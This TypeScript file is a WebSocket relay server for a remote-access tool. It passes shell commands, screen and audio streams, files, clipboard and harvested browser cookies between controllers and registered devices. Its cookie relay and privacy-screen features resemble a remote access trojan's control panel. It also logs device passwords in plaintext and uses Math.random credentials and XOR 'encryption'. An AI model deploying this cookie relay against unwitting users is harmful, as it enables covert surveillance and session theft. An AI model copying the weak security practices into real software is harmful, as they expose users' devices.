import { createServer } from 'http';
import { parse } from 'url';
import next from 'next';
import { WebSocketServer, WebSocket } from 'ws';
import { monitor } from './admin/monitor';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';

const dev = process.env.NODE_ENV !== 'production';
const app = next({ dev });
const handle = app.getRequestHandler();

function getOrGenerateCredentials() {
  const dataDir = path.join(process.cwd(), 'server', 'data');
  const credPath = path.join(dataDir, 'credentials.json');

  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }

  if (fs.existsSync(credPath)) {
    try {
      const content = fs.readFileSync(credPath, 'utf8');
      if (content.trim() === '') {
        throw new Error('Empty file');
      }
      return JSON.parse(content);
    } catch (e) {
      console.error('Error parsing credentials, regenerating...', e);
    }
  }

  const user = Math.random().toString(36).substring(2, 10);
  const pass = Math.random().toString(36).substring(2, 12);
  const creds = { user, pass };
  fs.writeFileSync(credPath, JSON.stringify(creds, null, 2));
  return creds;
}

function loadConfig() {
  const configPath = path.join(process.cwd(), 'server', 'config.json');
  // 默认配置，如果 config.json 不存在或缺少字段，将使用这些值
  let config: any = {
    TURN_URL: '',
    TURN_SECRET: '',
    STUN_URL: ''
  };

  if (fs.existsSync(configPath)) {
    try {
      const fileConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      config = { ...config, ...fileConfig };
      console.log('[*] Loaded configuration from server/config.json');
    } catch (e) {
      console.error('[-] Error parsing server/config.json', e);
    }
  }
  return config;
}

const config = loadConfig();

interface Device {
  id: string;
  password?: string;
  serviceWs?: WebSocket;
  desktopWs?: WebSocket;
  info: {
    hostname: string;
    ip: string;
    publicIp?: string;
    os: string;
    remark: string;
    platform: string;
  };
  lastSeen: number;
}

const devices = new Map<string, Device>();
const clients = new Set<WebSocket>();
// Track which devices each client is subscribed to for data forwarding
const clientSubscriptions = new Map<WebSocket, Set<string>>();
const clientVerifiedDevices = new Map<WebSocket, Set<string>>();

// Map to store WebSocket IPs for monitoring
const wsIps = new WeakMap<WebSocket, string>();
const wsLastSeen = new WeakMap<WebSocket, number>();

// Assistance code management
const assistanceCodes = new Map<string, WebSocket>();
const wsToAssistanceCode = new Map<WebSocket, string>();

function generateAssistanceCode(): string {
  let code = '';
  do {
    code = Math.floor(100000000 + Math.random() * 900000000).toString();
  } while (assistanceCodes.get(code));
  return code;
}

function getRealIp(req: any): string {
  const headers = [
    'x-forwarded-for',
    'x-real-ip',
    'true-client-ip',
    'cf-connecting-ip',
    'fastly-client-ip',
    'x-cluster-client-ip',
    'forwarded-for',
    'forwarded'
  ];

  

  for (const header of headers) {
    const value = req.headers[header];
    if (value) {
      const ip = typeof value === 'string' ? value.split(',')[0].trim() : value[0].split(',')[0].trim();
      if (ip && ip !== '127.0.0.1' && ip !== '::1' && ip !== '::ffff:127.0.0.1') {
        return ip;
      }
    }
  }

  const remote = req.socket.remoteAddress;
  if (remote && remote.startsWith('::ffff:')) {
    return remote.substring(7);
  }
  return remote || 'unknown';
}

app.prepare().then(() => {
  // Ensure credentials exist on startup
  getOrGenerateCredentials();

  const server = createServer((req, res) => {
    const parsedUrl = parse(req.url!, true);
    const { pathname, query } = parsedUrl;

    // Custom API for device status
    if (pathname === '/api/devices/status' || pathname?.endsWith('/api/devices/status')) {
      if (req.method === 'OPTIONS') {
        res.writeHead(204, {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type'
        });
        res.end();
        return;
      }
      
      const ids = (query.ids as string || '').split(',');
      const statusMap: Record<string, any> = {};
      
      ids.forEach(id => {
        const device = devices.get(id);
        if (device) {
          statusMap[id] = {
            online: true,
            ip: device.info.publicIp || device.info.ip,
            hostname: device.info.hostname,
            os: device.info.os,
            lastSeen: device.lastSeen
          };
        } else {
          statusMap[id] = { online: false };
        }
      });

      res.writeHead(200, { 
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      });
      res.end(JSON.stringify(statusMap));
      return;
    }

    handle(req, res, parsedUrl);
  });

  const wss = new WebSocketServer({ noServer: true });

  server.on('upgrade', (request, socket, head) => {
    const rawIp = getRealIp(request);
    const ip = rawIp.startsWith('::ffff:') ? rawIp.substring(7) : rawIp;
    
    console.log(`[Monitor] Upgrade request from IP: ${ip}, Blacklisted: ${monitor.isBlacklisted(ip)}`);
    
    // Blacklist check
    if (monitor.isBlacklisted(ip)) {
      console.log(`[Monitor] Blocked connection from blacklisted IP: ${ip}`);
      socket.destroy();
      return;
    }

    const { pathname } = parse(request.url || '', true);
    
    if (pathname?.endsWith('/ws')) {
      wss.handleUpgrade(request, socket, head, (ws) => {
        // Store IP for this websocket
        wsIps.set(ws, ip);
        
        // Wrap send to track TX traffic
        const originalSend = ws.send.bind(ws);
        ws.send = function(data: any, cb?: any) {
          const len = Buffer.isBuffer(data) ? data.length : Buffer.byteLength(data as string);
          monitor.recordTraffic(ip, 0, len);
          originalSend(data, cb);
        } as any;

        wss.emit('connection', ws, request);
      });
    }
  });

  wss.on('connection', (ws, req) => {
    const { pathname } = parse(req.url || '', true);
    const ip = wsIps.get(ws) || req.socket.remoteAddress || 'unknown';
    
    // Handle Admin Monitor WebSocket
    if (pathname?.endsWith('/admin/ws')) {
      let isAdminAuthenticated = false;
      
      ws.on('message', (message) => {
        monitor.recordTraffic(ip, Buffer.byteLength(message as Buffer), 0);
        try {
          const data = JSON.parse(message.toString());
          if (data.type === 'admin_auth') {
            const creds = getOrGenerateCredentials();
            
            if (data.user === creds.user && data.pass === creds.pass) {
              isAdminAuthenticated = true;
              monitor.addAdminClient(ws);
              ws.send(JSON.stringify({ type: 'admin_auth_success' }));
            } else {
              ws.send(JSON.stringify({ type: 'admin_auth_error', message: '账号密码错误' }));
              ws.close();
            }
          } else if (isAdminAuthenticated && data.type === 'admin_command') {
            if (data.action === 'blacklist_add') {
              const ipToAdd = data.ip.startsWith('::ffff:') ? data.ip.substring(7) : data.ip;
              monitor.addToBlacklist(ipToAdd);
              // Disconnect any active sockets from this IP
              wss.clients.forEach(client => {
                if (wsIps.get(client) === ipToAdd) {
                  client.close();
                }
              });
            } else if (data.action === 'blacklist_remove') {
              const ipToRemove = data.ip.startsWith('::ffff:') ? data.ip.substring(7) : data.ip;
              monitor.removeFromBlacklist(ipToRemove);
            } else if (data.action === 'kick_session') {
              // Disconnect the controller IP
              wss.clients.forEach(client => {
                if (wsIps.get(client) === data.controllerIp) {
                  client.close();
                }
              });
            }
          }
        } catch (e) {}
      });
      return;
    }

    console.log(`New connection from ${ip}`);
    wsLastSeen.set(ws, Date.now());

    let deviceId: string | null = null;
    let isClient = false;

    ws.on('message', (message: Buffer, isBinary: boolean) => {
      wsLastSeen.set(ws, Date.now());
      const msgLen = isBinary ? message.length : Buffer.byteLength(message.toString());
      monitor.recordTraffic(ip, msgLen, 0);

      if (isBinary) {
        // Forward binary data to all frontend clients
        // Inject deviceId: [msg_type, id_len, ...device_id, ...data]
        if (deviceId) {
            const idBuffer = Buffer.from(deviceId, 'utf-8');
            const header = Buffer.alloc(2 + idBuffer.length);
            header[0] = message[0]; // msg_type
            header[1] = idBuffer.length; // id_len
            header.set(idBuffer, 2);
            
            const binaryMessage = Buffer.concat([header, message.subarray(1)]);
            
            // Determine feature based on msg_type
            let feature = 'unknown';
            if (message[0] === 4 || message[0] === 5) feature = 'screen';
            else if (message[0] === 6 || message[0] === 7) feature = 'window';
            else if (message[0] === 0x01) feature = 'screen'; // Legacy
            else if (message[0] === 0x02 || message[0] === 0x03) feature = 'audio';
            
            console.log(`[Server] Forwarding binary message of size: ${binaryMessage.length} from ${deviceId}`);
            clients.forEach(client => {
              if (client.readyState === WebSocket.OPEN) {
                const subs = clientSubscriptions.get(client);
                if (subs && subs.has(deviceId!)) {
                  client.send(binaryMessage);
                  // Record session activity
                  const controllerIp = wsIps.get(client) || 'unknown';
                  const device = devices.get(deviceId!);
                  const clientIp = device?.info?.publicIp || device?.info?.ip || ip;
                  const systemInfo = device ? `${device.info.os || ''} ${device.info.platform || ''}`.trim() : 'Unknown';
                  monitor.recordSessionActivity(controllerIp, clientIp, deviceId!, systemInfo, feature, binaryMessage.length);
                }
              }
            });
        }
        return;
      }

      try {
        const data = JSON.parse(message.toString());
        
        // Handle dynamic TURN configuration request
        if (data.type === 'get_turn_config') {
          const { deviceId, password } = data;
          const targetDevice = devices.get(deviceId);
          
          // Verify password
          if (!targetDevice || (targetDevice.password && targetDevice.password !== password)) {
            ws.send(JSON.stringify({ type: 'error', message: 'Invalid device password for TURN config' }));
            return;
          }

          const secret = config.TURN_SECRET;
          const turnUrl = config.TURN_URL;
          const stunUrl = config.STUN_URL;
          
          const timestamp = Math.floor(Date.now() / 1000) + 24 * 3600;
          const username = `${timestamp}:yyds`;
          const turnPassword = crypto.createHmac('sha1', secret).update(username).digest('base64');
          
          const iceServers = [
            { urls: turnUrl, username, credential: turnPassword },
            { urls: stunUrl },
            { urls: 'stun:stun.l.google.com:19302' }
          ];

          // Simple XOR encryption using device password
          const jsonStr = JSON.stringify(iceServers);
          const key = crypto.createHash('sha256').update(password || '').digest();
          const encrypted = Buffer.alloc(jsonStr.length);
          for (let i = 0; i < jsonStr.length; i++) {
            encrypted[i] = jsonStr.charCodeAt(i) ^ key[i % key.length];
          }
          
          ws.send(JSON.stringify({
            type: 'turn_config',
            encryptedData: encrypted.toString('base64')
          }));
          return;
        }
        
        // Handle frontend client identification
        if (data.type === 'client_connect') {
          isClient = true;
          if (data.publicIp && data.publicIp !== 'unknown') {
            wsIps.set(ws, data.publicIp);
            monitor.registerConnection(data.publicIp, 'controller');
          } else {
            monitor.registerConnection(ip, 'controller');
          }
          clients.add(ws);
          clientSubscriptions.set(ws, new Set());
          clientVerifiedDevices.set(ws, new Set());
          
          // Generate and send assistance code
          const code = generateAssistanceCode();
          assistanceCodes.set(code, ws);
          wsToAssistanceCode.set(ws, code);
          ws.send(JSON.stringify({ type: 'assistance_code', code }));
          
          return;
        }

        // Handle assistance request from device
        if (data.type === 'assistance_request') {
          const { code, deviceId: reqId, password, info } = data;
          const targetWs = assistanceCodes.get(code);
          if (targetWs && targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify({
              type: 'assistance_request',
              deviceId: reqId,
              password,
              info
            }));
          } else {
            ws.send(JSON.stringify({
              type: 'assistance_response',
              success: false,
              message: '协助码无效或对方已离线'
            }));
          }
          return;
        }

        // Handle assistance response from client
        if (data.type === 'assistance_response') {
          const { deviceId: reqId, success, message } = data;
          const device = devices.get(reqId);
          if (device && device.serviceWs && device.serviceWs.readyState === WebSocket.OPEN) {
            device.serviceWs.send(JSON.stringify({
              type: 'assistance_response',
              success,
              message
            }));
          }
          return;
        }

        // Handle device authentication
        if (data.type === 'device_auth') {
          const { deviceId, password } = data;
          const device = devices.get(deviceId);
          
          if (device && device.password === password) {
            // 验证通过，仅向该控制端发送该设备信息
            const verifiedSet = clientVerifiedDevices.get(ws);
            if (verifiedSet) {
              verifiedSet.add(deviceId);
            }
            
            const { password: _, ...infoWithoutPassword } = device.info as any;
            ws.send(JSON.stringify({
              type: 'device_auth_success',
              device: {
                id: device.id,
                ...infoWithoutPassword,
                status: 'online',
                lastSeen: device.lastSeen
              }
            }));
          } else {
            ws.send(JSON.stringify({
              type: 'device_auth_error',
              message: '设备不存在或密码错误'
            }));
          }
          return;
        }

        // Handle messages from devices
        if (data.type === 'pong' || data.type === 'register' || data.type === 'update_password') {
          monitor.registerConnection(ip, 'client');
          const id = data.deviceId || (data.data && data.data.id) || deviceId;
          const password = data.password || (data.data && data.data.password);
          const role = data.role || (data.data && data.data.role) || 'service';
          
          // Remove sensitive fields from deviceInfo before storing
          const deviceInfo = { ...(data.data || {}) };
          delete deviceInfo.password;
          delete deviceInfo.id;
          deviceInfo.publicIp = deviceInfo.publicIp || ip;
          
          if (id) {
            // If the device ID for this connection has changed, clean up the old one
            if (deviceId && deviceId !== id) {
              console.log(`[Server] Device ID changed from ${deviceId} to ${id} for the same connection. Cleaning up old ID.`);
              devices.delete(deviceId);
            }
            
            const oldPassword = devices.get(id)?.password;
            deviceId = id; // Sync local variable
            let device = devices.get(id);
            
            if (!device) {
              // Re-register if not found (e.g. server restart or first time)
              device = {
                id: id,
                password: password,
                serviceWs: (role === 'service' || role === 'portable') ? ws : undefined,
                desktopWs: (role === 'desktop' || role === 'portable') ? ws : undefined,
                info: deviceInfo,
                lastSeen: Date.now()
              };
              devices.set(id, device);
              console.log(`[Server] Device registered/re-registered via ${data.type}: ${id} (Password: ${password ? 'PROVIDED' : 'NONE'})`);
            } else {
              // Update existing
              device.lastSeen = Date.now();
              if (password) {
                // If password changed, invalidate sessions
                if (oldPassword && oldPassword !== password) {
                  console.log(`[Server] Device password changed for ${id} (from ${oldPassword} to ${password}), invalidating sessions`);
                  for (const [clientWs, verifiedDevices] of clientVerifiedDevices.entries()) {
                    if (verifiedDevices.has(id)) {
                      verifiedDevices.delete(id);
                      clientWs.send(JSON.stringify({ 
                        type: 'session_invalidated', 
                        deviceId: id,
                        message: `设备 ${id} 密码已在客户端更新，请重新连接`
                      }));
                    }
                  }
                }
                device.password = password;
              }
              if (deviceInfo) {
                // Merge info, ensuring id and password in info are also updated if present
                device.info = { ...device.info, ...deviceInfo };
              }
              if (role === 'service') {
                device.serviceWs = ws;
              } else if (role === 'desktop') {
                device.desktopWs = ws;
              } else if (role === 'portable') {
                device.serviceWs = ws;
                device.desktopWs = ws;
              }
            }
            broadcastDeviceList();
            
            // Forward pong to clients for latency measurement
            if (data.type === 'pong') {
                broadcastToClients({
                    type: 'pong',
                    deviceId: id,
                    data: deviceInfo
                }, id);
            }

            // If it was an explicit update_password, send result
            if (data.type === 'update_password') {
                ws.send(JSON.stringify({ type: 'update_password_result', success: true }));
            }
          }
          return;
        }

        if (deviceId) {
          const device = devices.get(deviceId);
          if (device) {
            device.lastSeen = Date.now();

            // Forward data to all clients
            if (['screen', 'screen_frame', 'window_frame', 'window_stream', 'output', 'files', 'drives', 'file_list', 'drive_list', 'error', 'windows', 'window_list', 'file_content', 'browser_cookies', 'browser_list', 'audio_data', 'hardware_info', 'performance_metrics', 'screen_metadata', 'window_metadata', 'chat_message', 'notification', 'file_progress', 'file_cancel', 'screenshot', 'clipboard', 'webrtc_answer', 'webrtc_ice_candidate'].includes(data.type)) {
              const { type, data: payload, path, password: _, ...rest } = data;
              broadcastToClients({
                type: data.type === 'screen' ? 'screen_frame' : 
                      data.type === 'window_frame' ? 'window_frame' :
                      data.type === 'window_stream' ? 'window_frame' :
                      data.type === 'output' ? 'terminal_output' : 
                      data.type === 'error' ? 'terminal_error' :
                      data.type === 'files' ? 'file_list' : 
                      data.type === 'drives' ? 'drive_list' :
                      data.type === 'file_list' ? 'file_list' :
                      data.type === 'drive_list' ? 'drive_list' :
                      data.type === 'windows' ? 'window_list' :
                      data.type === 'window_list' ? 'window_list' :
                      data.type === 'file_content' ? 'file_download' : 
                      data.type === 'browser_cookies' ? 'browser_cookies' :
                      data.type === 'browser_list' ? 'browser_list' :
                      data.type === 'audio_data' ? 'audio_data' : 
                      data.type === 'screen_metadata' ? 'screen_metadata' :
                      data.type === 'window_metadata' ? 'window_metadata' :
                      data.type === 'hardware_info' ? 'hardware_info' :
                      data.type === 'chat_message' ? 'chat_message' :
                      data.type === 'notification' ? 'notification' :
                      data.type === 'file_progress' ? 'file_progress' :
                      data.type === 'file_cancel' ? 'file_cancel' :
                      data.type === 'screenshot' ? 'screenshot' :
                      data.type === 'clipboard' ? 'clipboard' :
                      data.type === 'webrtc_answer' ? 'webrtc_answer' :
                      data.type === 'webrtc_ice_candidate' ? 'webrtc_ice_candidate' :
                      data.type === 'performance_metrics' ? 'performance_metrics' : 'unknown',
                deviceId: deviceId,
                data: payload,
                path: path,
                ...rest
              }, deviceId, device.info.ip);
            }
          }
        }

        // Handle messages from frontend clients
        if (isClient) {
          if (data.type === 'refresh_device_status') {
            const targetDevice = devices.get(data.deviceId);
            
            // 返回设备状态（不验证密码，仅返回在线/离线基础状态）
            if (targetDevice) {
              const { password: _, ...infoWithoutPassword } = targetDevice.info as any;
              ws.send(JSON.stringify({
                type: 'device_status',
                deviceId: targetDevice.id,
                info: infoWithoutPassword,
                status: 'online',
                lastSeen: targetDevice.lastSeen
              }));
            } else {
              ws.send(JSON.stringify({
                type: 'device_status',
                deviceId: data.deviceId,
                status: 'offline'
              }));
            }
            return;
          }

          if (data.type === 'verify_device') {
            const targetDevice = devices.get(data.deviceId);
            if (!targetDevice) {
              ws.send(JSON.stringify({ type: 'verify_result', success: false, message: '设备不存在或已离线', deviceId: data.deviceId }));
              return;
            }
            if (targetDevice.password && targetDevice.password !== data.password) {
              console.log(`[-] Password mismatch for device ${data.deviceId}`);
              ws.send(JSON.stringify({ type: 'verify_result', success: false, message: '设备密码错误', deviceId: data.deviceId }));
              return;
            }
            
            // Mark device as verified for this client
            const verifiedSet = clientVerifiedDevices.get(ws);
            if (verifiedSet) {
              verifiedSet.add(data.deviceId);
            }
            
            const { password: _, ...infoWithoutPassword } = targetDevice.info as any;
            ws.send(JSON.stringify({ type: 'verify_result', success: true, deviceId: data.deviceId, info: infoWithoutPassword }));
            return;
          }

          if (data.type === 'webrtc_offer' || data.type === 'webrtc_ice_candidate') {
            const targetDevice = devices.get(data.deviceId);
            if (targetDevice && targetDevice.desktopWs && targetDevice.desktopWs.readyState === WebSocket.OPEN) {
                targetDevice.desktopWs.send(JSON.stringify({
                    command: data.type,
                    args: data.args,
                    deviceId: data.deviceId,
                    password: targetDevice.password || ''
                }));
            }
            return;
          }

          if (data.type === 'command') {
            const targetDevice = devices.get(data.deviceId);
            
            // Verify password if provided or if device has one
            if (targetDevice && targetDevice.password) {
              const verifiedSet = clientVerifiedDevices.get(ws);
              const isVerified = verifiedSet && verifiedSet.has(data.deviceId);
              
              if (!isVerified && data.password !== targetDevice.password) {
                ws.send(JSON.stringify({
                  type: 'error',
                  message: 'Invalid device password',
                  deviceId: data.deviceId
                }));
                return;
              }
            }

            console.log(`[Server] Received command from client: ${data.command} for device ${data.deviceId}`);
            
            if (targetDevice) {
              // Record session activity
              const clientIp = targetDevice.info?.publicIp || targetDevice.info?.ip || ip;
              const systemInfo = `${targetDevice.info.os || ''} ${targetDevice.info.platform || ''}`.trim();
              monitor.recordSessionActivity(ip, clientIp, targetDevice.id, systemInfo, data.command, msgLen);
            }
            
            // Subscribe the client to this device
            const subs = clientSubscriptions.get(ws);
            if (subs) {
                subs.add(data.deviceId);
            }
            
            if (targetDevice) {
                let targetWs = targetDevice.serviceWs;
                const desktopCommands = ['screen', 'window_stream', 'window_control', 'window_input', 'clipboard', 'audio', 'audio_input', 'windows', 'input', 'privacy_screen', 'chat', 'webrtc_offer', 'webrtc_ice_candidate'];
                if (desktopCommands.includes(data.command)) {
                  targetWs = targetDevice.desktopWs;
                }
                
                if (targetWs && targetWs.readyState === WebSocket.OPEN) {
                  let command = data.command;
                  let args = data.args;

                  // Fix Windows CMD encoding by forcing UTF-8
                  if (command === 'exec' && typeof args === 'string' && targetDevice.info.os.toLowerCase().includes('win')) {
                    // If it's not already trying to change code page, prepend it
                    if (!args.includes('chcp')) {
                      args = `chcp 65001 > nul && ${args}`;
                    }
                  }

                  targetWs.send(JSON.stringify({
                    command: command,
                    args: args,
                    deviceId: data.deviceId,
                    password: data.password || targetDevice.password || ''
                  }));
                  console.log(`[Server] Forwarded command to device ${data.deviceId}`);
                  
                  // Update viewer count if screen is started or stopped
                  if (command === 'screen' && typeof args === 'object' && args !== null) {
                      const action = (args as any).action;
                      if (action === 'stop') {
                          // Unsubscribe
                          const subs = clientSubscriptions.get(ws);
                          if (subs) {
                              subs.delete(data.deviceId);
                          }
                      }
                      
                      if (action === 'start' || action === 'stop') {
                          // Count clients subscribed to this device
                          let viewerCount = 0;
                          for (const [clientWs, subs] of clientSubscriptions.entries()) {
                              if (subs.has(data.deviceId)) {
                                  viewerCount++;
                              }
                          }
                          targetWs.send(JSON.stringify({
                              command: 'viewer_count',
                              args: { count: viewerCount },
                              deviceId: data.deviceId,
                              password: targetDevice.password || ''
                          }));
                      }
                  }
                } else {
                    console.log(`[Server] Device ${data.deviceId} socket not open for command ${data.command}`);
                    ws.send(JSON.stringify({
                        type: 'error',
                        message: `设备 ${data.deviceId} 的 ${desktopCommands.includes(data.command) ? '桌面(UI)' : '服务(Service)'} 尚未连接。可能停留在登录界面或未启动。`,
                        deviceId: data.deviceId
                    }));
                }
            } else {
                console.log(`[Server] Target device ${data.deviceId} not found. Available: ${Array.from(devices.keys()).join(', ')}`);
            }
          }
        }

      } catch (e) {
        console.error('Error parsing message:', e);
      }
    });

    ws.on('close', () => {
      if (deviceId) {
        devices.delete(deviceId);
        console.log(`Device disconnected: ${deviceId}`);
        broadcastDeviceList();
      }
      if (isClient) {
        // Clean up assistance code
        const code = wsToAssistanceCode.get(ws);
        if (code) {
          assistanceCodes.delete(code);
          wsToAssistanceCode.delete(ws);
        }

        const subs = clientSubscriptions.get(ws);
        if (subs) {
            subs.forEach(subDeviceId => {
                const targetDevice = devices.get(subDeviceId);
                if (targetDevice && targetDevice.desktopWs && targetDevice.desktopWs.readyState === WebSocket.OPEN) {
                    // Count remaining clients subscribed to this device
                    let remainingClients = 0;
                    for (const [clientWs, otherSubs] of clientSubscriptions.entries()) {
                        if (clientWs !== ws && otherSubs.has(subDeviceId)) {
                            remainingClients++;
                        }
                    }
                    
                    if (remainingClients === 0) {
                        targetDevice.desktopWs.send(JSON.stringify({
                            command: 'screen',
                            args: { action: 'stop' },
                            deviceId: subDeviceId,
                            password: targetDevice.password || ''
                        }));
                    }
                    
                    // Notify device of viewer count
                    targetDevice.desktopWs.send(JSON.stringify({
                        command: 'viewer_count',
                        args: { count: remainingClients },
                        deviceId: subDeviceId,
                        password: targetDevice.password || ''
                    }));

                    // Notify other clients connected to this device
                    for (const [clientWs, otherSubs] of clientSubscriptions.entries()) {
                        if (otherSubs.has(subDeviceId)) {
                            clientWs.send(JSON.stringify({
                                type: 'viewer_count',
                                deviceId: subDeviceId,
                                count: remainingClients
                            }));
                        }
                    }
                }
            });
        }
        clients.delete(ws);
        clientSubscriptions.delete(ws);
        clientVerifiedDevices.delete(ws);
      }
    });

    ws.on('error', (error) => {
      console.error('WebSocket error:', error);
    });
  });

  function broadcastDeviceList() {
    const deviceList = Array.from(devices.values()).map(d => {
      const { password, ...infoWithoutPassword } = d.info as any;
      return {
        id: d.id,
        ...infoWithoutPassword,
        status: 'online',
        lastSeen: d.lastSeen
      };
    });
    
    const message = JSON.stringify({
      type: 'device_list',
      devices: deviceList
    });

    clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  }

  function sendDeviceList(ws: WebSocket) {
    const deviceList = Array.from(devices.values()).map(d => {
      const { password, ...infoWithoutPassword } = d.info as any;
      return {
        id: d.id,
        ...infoWithoutPassword,
        status: 'online',
        lastSeen: d.lastSeen
      };
    });
    
    ws.send(JSON.stringify({
      type: 'device_list',
      devices: deviceList
    }));
  }

  function broadcastToClients(message: any, targetDeviceId?: string, deviceIp?: string) {
    const msgString = JSON.stringify(message);
    const msgLen = Buffer.byteLength(msgString);
    
    clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        if (!targetDeviceId) {
            client.send(msgString);
        } else {
            const subs = clientSubscriptions.get(client);
            if (subs && subs.has(targetDeviceId)) {
                client.send(msgString);
                
                // Record session activity for JSON responses
                if (deviceIp) {
                  const controllerIp = wsIps.get(client) || 'unknown';
                  let feature = 'unknown';
                  if (message.type === 'screen_frame') feature = 'screen';
                  else if (message.type === 'window_frame') feature = 'window';
                  else if (message.type === 'terminal_output' || message.type === 'terminal_error') feature = 'terminal';
                  else if (message.type === 'file_list' || message.type === 'drive_list' || message.type === 'file_download' || message.type === 'file_progress') feature = 'files';
                  else if (message.type === 'hardware_info' || message.type === 'performance_metrics') feature = 'monitor';
                  else if (message.type === 'window_list') feature = 'windows';
                  else if (message.type === 'chat_message') feature = 'chat';
                  
                  if (feature !== 'unknown') {
                    const device = devices.get(targetDeviceId);
                    const systemInfo = device ? `${device.info.os || ''} ${device.info.platform || ''}`.trim() : 'Unknown';
                    const clientIp = device?.info?.publicIp || device?.info?.ip || deviceIp;
                    monitor.recordSessionActivity(controllerIp, clientIp, targetDeviceId, systemInfo, feature, msgLen);
                  }
                }
            }
        }
      }
    });
  }

  // Ping devices periodically to keep connections alive and check status
  setInterval(() => {
    const now = Date.now();
    const TIMEOUT = 3 * 60 * 1000; // 3 minutes timeout

    // 1. Ping all identified devices and check timeout
    devices.forEach((device, id) => {
      let isAlive = false;
      if (device.serviceWs && device.serviceWs.readyState === WebSocket.OPEN) {
        device.serviceWs.send(JSON.stringify({ command: 'ping' }));
        if (now - (wsLastSeen.get(device.serviceWs) || now) < TIMEOUT) isAlive = true;
      }
      if (device.desktopWs && device.desktopWs.readyState === WebSocket.OPEN) {
        device.desktopWs.send(JSON.stringify({ command: 'ping' }));
        if (now - (wsLastSeen.get(device.desktopWs) || now) < TIMEOUT) isAlive = true;
      }
      if (!isAlive) {
        if (device.serviceWs) device.serviceWs.close();
        if (device.desktopWs) device.desktopWs.close();
        devices.delete(id);
        broadcastDeviceList();
      }
    });

    // 2. Ping controllers and check timeout
    clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({ command: 'ping' }));
        if (now - (wsLastSeen.get(client) || now) > TIMEOUT) {
          client.close();
          clients.delete(client);
        }
      } else {
        clients.delete(client);
      }
    });

    // 3. Also ping all unidentified sockets that are not frontend clients
    // This helps re-discover devices after a server restart if they are still connected
    wss.clients.forEach(ws => {
      // Check if this socket is already in the devices Map or clients Set
      const isRegisteredDevice = Array.from(devices.values()).some(d => d.serviceWs === ws || d.desktopWs === ws);
      const isFrontendClient = clients.has(ws);
      
      if (!isRegisteredDevice && !isFrontendClient && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ command: 'ping' }));
        if (now - (wsLastSeen.get(ws) || now) > TIMEOUT) {
          ws.close();
        }
      }
    });
  }, 10000);

  // Sync active connections to monitor every second
  setInterval(() => {
    const activeControllers = Array.from(clients).map(ws => ({
      ip: wsIps.get(ws) || 'unknown',
      lastSeen: wsLastSeen.get(ws) || Date.now(),
      assistanceCode: wsToAssistanceCode.get(ws)
    }));

    const activeClients = Array.from(devices.values()).map(device => ({
      id: device.id,
      ip: device.info.publicIp || 'unknown', 
      hostname: device.info.hostname,
      lastSeen: Math.max(
        wsLastSeen.get(device.serviceWs as WebSocket) || 0,
        wsLastSeen.get(device.desktopWs as WebSocket) || 0
      ) || device.lastSeen
    }));

    monitor.updateActiveConnections(activeControllers, activeClients);
  }, 1000);

  const port = process.env.PORT || 3000;
  server.listen(port, () => {
    console.log(`> websokit协议启动成功 - 端口${port}`);

  });
});
